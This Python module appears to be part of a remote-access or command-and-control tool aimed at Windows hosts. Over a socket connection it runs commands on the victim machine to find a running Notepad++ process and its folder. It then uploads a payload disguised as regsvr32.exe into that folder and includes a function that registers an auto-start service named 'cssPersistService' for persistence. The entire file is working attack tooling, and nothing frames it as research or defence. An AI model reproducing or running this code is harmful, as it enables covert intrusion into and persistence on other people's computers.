import socket
import time
from lib import config, server_call as server


def find_npp_task(client: socket.socket):
    return server.call_exec(client, 'tasklist | findstr /I "npp"')


def find_npp_dir(client: socket.socket) -> str:
    return (
        server.call_exec(client, "where /r C:\\Users *npp*.exe")
        .replace("\r", "")
        .replace("\n", "")
    )


def find_regsvr32(client: socket.socket) -> str:
    return (
        server.call_exec(client, "where /r C:\\Users regsvr32.exe")
        .replace("\r", "")
        .replace("\n", "")
    )


def send_regsvr32(client: socket.socket, dir: str):
    server.call_upload(client, (config.ITR_CLIENT_FILEPATH, f"{dir}\\regsvr32.exe"))


def call_persist_startup(client: socket.socket):
    executable_path = find_regsvr32(client)
    time.sleep(3)
    server.call_exec(
        client, f"sc create cssPersistService binPath= {executable_path} start= auto"
    )


def found_npp_handler(client: socket.socket):
    res = find_npp_dir(client)
    time.sleep(5)
    send_regsvr32(client, "\\".join(res.split("\\")[:-1]))
    time.sleep(5)


def script(client: socket.socket):
    found_npp = False
    while True:
        time.sleep(2)
        if found_npp:
            break
        else:
            result = find_npp_task(client)
            if "npp" in str(result):
                found_npp = True

    found_npp_handler(client)

    server.call_quit(client)
